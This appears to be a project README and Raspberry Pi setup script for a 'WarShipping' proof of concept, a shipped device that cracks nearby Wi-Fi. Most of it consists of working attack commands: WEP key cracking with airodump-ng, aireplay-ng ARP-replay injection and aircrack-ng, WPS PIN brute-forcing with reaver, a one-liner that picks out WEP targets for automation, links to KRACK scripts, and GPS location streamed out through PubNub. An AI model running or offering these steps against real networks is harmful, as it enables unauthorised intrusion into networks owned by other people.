# WarShipping
WarShipping remixed as a proof of concept.

WEP cracking using airmon-ng
- iwconfig
- airmon-ng start <wireless card>
- airodump-ng <mon card>
- airodump-ng <mon card> --bssid <bssid> -w <write to file> file
(if theres not enough traffic to crack the password)
on another tab:
- aireplay-ng -3 -b <bssid> -h <host connected to network> <mon card>
(cracking the password)
- aircrack-ng <file>.cap

Test 0 (Manual attack)
- manual testing worked, arp poisoning aided but not required with active network.
- one terminal window required unless arp poisoning required.

Test 1 (Automation attempt)
- airodump-ng <mon card> -w <write to> file
- file .csv contains wireless points caught in monitor mode
- cat *.csv | grep -i wep | cut -d ',' -f 1
  - above bash oneliner isolates the bssid of each access point
  
WPA2 (KRACK attack)
- https://github.com/vanhoefm/krackattacks-scripts
- script above is for testing krack attack vulnerability instead of attacking the Wi-Fi security.

When GPS location has been reached the device will instead of attacking all networks will scan them for vulnerabilities.
https://www.youtube.com/watch?v=N8fH0nc9v9Q
https://sparklers-the-makers.github.io/blog/robotics/use-neo-6m-module-with-raspberry-pi/

Warshipping device proof of concept

clear
echo "-- UPDATING SYSTEM PLEASE WAIT"
apt-get update
apt-get dist-upgrade -y
clear

# echo "-- INSTALLING DEPENDENCIES"
apt-get install aircrack-ng
apt-get install libnl-3-dev
apt-get install libnl-genl-3-dev
apt-get install pkg-config
apt-get install libssl-dev
apt-get install net-tools
apt-get install git
apt-get install sysfsutils
apt-get install python-scapy
apt-get install python-pycryptodome
apt-get install virtualenv
apt-get install reaver
apt-get install wash
apt-get install -y python-smbus
apt-get install -y i2c-tools
pip3 install RPI.GPIO
pip3 install adafruit-blinka
pip3 install adafruit-circuitpython-gps
pip3 install pubnub
clear

# WPS
echo "clear" > WPS.sh
echo "echo '-- WPS DECODING CHEATSHEET\n'" >> WPS.sh
echo "echo 'use wash to listen through the interface set to monitor mode'" >> WPS.sh
echo "echo 'sudo wash -i wlan0mon'" >> WPS.sh
echo "echo 'brute force the access point WPS pin'" >> WPS.sh
echo "echo 'sudo reaver -i wlan0mon -b <bssid> -vv'" >> WPS.sh
chmod +x WPS.sh

# WEP
echo "clear" > WEP.sh
echo "echo '-- WEP DECODING CHEATSHEET\n'" >> WEP.sh
echo "echo '- listen to accesspoint'" >> WEP.sh
echo "echo '- airodump-ng --bssid <bssid copied earlier> -w <capture file output filename>'" >> WEP.sh
echo "echo '- on new tab packet injection'" >> WEP.sh
echo "echo '- aireplay-ng -3 <arpReplay> -b <bssid copied earlier> -h <device caught on airodump-ng output>'" >> WEP.sh
echo "echo '- decode capture file'" >> WEP.sh
echo "echo '- aircrack-ng *.cap'" >> WEP.sh
chmod +x WEP.sh

# WPA2 KRACK
echo "clear" > WPA2.sh
echo "echo '-- WPA2 DECODING CHEATSHEET\n'" >> WPA2.sh
echo "echo 'KRACK (Key Reinstallation attACK) scanner'" >> WPA2.sh
echo "echo 'https://www.youtube.com/watch?v=Gb8h6M22a6o'" >> WPA2.sh
echo "echo 'https://github.com/vanhoefm/krackattacks-scripts'" >> WPA2.sh
echo "echo 'cd hostapd'" >> WPA2.sh
echo "echo 'cp defconfig .config'" >> WPA2.sh
echo "echo 'make -j 2'" >> WPA2.sh
echo "sudo git clone https://github.com/vanhoefm/krackattacks-scripts" >> WPA2RepoClone.sh
chmod +x WPA2.sh
chmod +x WPA2RepoClone.sh

# GPS
echo "clear" > GPS.sh
echo "echo'-- GPS SETUP\n'" >> GPS.sh
echo "echo'raspi-config'" >> GPS.sh
echo "echo'Interfaceing Options'" >> GPS.sh
echo "echo'Serial > yes'" >> GPS.sh
echo "echo'raspi-config'" >> GPS.sh
echo "echo'Interfaceing Options'" >> GPS.sh
echo "echo'I2C > yes'" >> GPS.sh
echo "echo'raspi-config'" >> GPS.sh
echo "echo'Interfaceing Options'" >> GPS.sh
echo "echo'SPI > yes'" >> GPS.sh
echo "echo'sudo reboot'" >> GPS.sh
chmod +x GPS.sh

# BLINKYTEST.PY
echo "import board" > blinkytest.py
echo "import digitalio" >> blinkytest.py
echo "import busio\n" >> blinkytest.py
echo "print('Hello blinky!')\n\n" >> blinkytest.py
echo "# Try to great a Digital input" >> blinkytest.py
echo "pin = digitalio.DigitalInOut(board.D4)" >> blinkytest.py
echo 'print("Digital IO ok!")' >> blinkytest.py
echo "# Try to create an I2C device" >> blinkytest.py
echo "i2c = busio.I2C(board.SCL, board.SDA)" >> blinkytest.py
echo 'print("I2C ok!")' >> blinkytest.py
echo "# Try to create an SPI device" >> blinkytest.py
echo "spi = busio.SPI(board.SCLK, board.MOSI, board.MISO)" >> blinkytest.py
echo 'print("SPI ok!")' >> blinkytest.py
echo 'print("done!")' >> blinkytest.py
chmod +x blinkytest.py

# GPS TEST
echo "clear" > GPSTEST.sh
echo "echo'-- GPSTEST\nrun blinkytest.py'" >> GPSTEST.sh
echo "git clone https://github.com/adafruit/Adafruit_CircuitPython_GPS.git" >> GPSTEST.sh
echo "echo'cd Adafruit_CircuitPython_GPS'" >> GPSTEST.sh
echo "echo'examples'" >> GPSTEST.sh
echo "echo'nano gps_simpletest.py'" >> GPSTEST.sh
echo "echo'locate and comment out these linkes: \n RX = board.RX \n TX = board.TX'" >> GPSTEST.sh
echo "echo'then comment out: uart = busio.UART(TX, RX, baudrate=9600, timeout=3000)'" >> GPSTEST.sh
echo "echo'uncomment: \n \#import serial \n \#uart = serial.Serial(/dev/ttyUSB0, baudrate=9600, timeout=3000)'" >> GPSTEST.sh
echo "echo'\#uart = serial.Serial(/dev/ttyS0, baudrate=9600, timeout=3000)'" >> GPSTEST.sh
echo "echo'run the gps_simpletest.py'" >> GPSTEST.sh
chmod +x GPSTEST.sh

# TUNNEL GPS STREAM THROUGH PUBNUB
echo "import pubnub\n" > GPSSTREAM.py
echo "from pubnub.pnconfiguration import PNConfiguration" >> GPSSTREAM.py
echo "from pubnub.pubnub import PubNub" >> GPSSTREAM.py
echo "from pubnub.callbacks import SubscribeCallback" >> GPSSTREAM.py
echo "from pubnub.enums import PNOperationType, PNStatusCategory" >> GPSSTREAM.py
echo "pnconfig = PNConfiguration()" >> GPSSTREAM.py
echo 'pnconfig.subscribe_key = "YOUR SUBSCRIBE KEY"' >> GPSSTREAM.py
echo 'pnconfig.publish_key = "YOUR PUBLISH KEY"' >> GPSSTREAM.py
echo 'pnconfig.ssl = False' >> GPSSTREAM.py
echo 'pubnub = PubNub(pnconfig)' >> GPSSTREAM.py
echo 'def publish_callback(result, status):' >> GPSSTREAM.py
echo '  pass' >> GPSSTREAM.py
        # Handle PNPublishResult and PNStatus
echo 'When you want to publish multiple variables in one JSON, you must create a dictionary like so:' >> GPSSTREAM.sh
echo 'dictionary = {"DATA 1 NAME": gps.DATA1, "DATA 2 NAME": gps.DATA2}' >> GPSSTREAM.sh
echo 'So in our case we would write:' >> GPSSTREAM.sh
echo 'dictionary = {"latitude": gps.latitude, "longitude": gps.longitude}' >> GPSSTREAM.sh
echo 'And then to publish that data, you would format the dictionary like this:' >> GPSSTREAM.sh
echo 'pubnub.publish().channel("CHANNEL").message(dictionary).pn_async(publish_callback)' >> GPSSTREAM.sh
chmod +x GPSSTREAM.py
chmod +x GPSSTREAM.sh

# start up
clear
echo "-- DOCUMENTATIONS\n"
echo "- copy the bssid of chosen network before ctrl+c"
sleep 4
airmon-ng start wlan0 #change 0 to your network adapter
airodump-ng wlan0mon -W
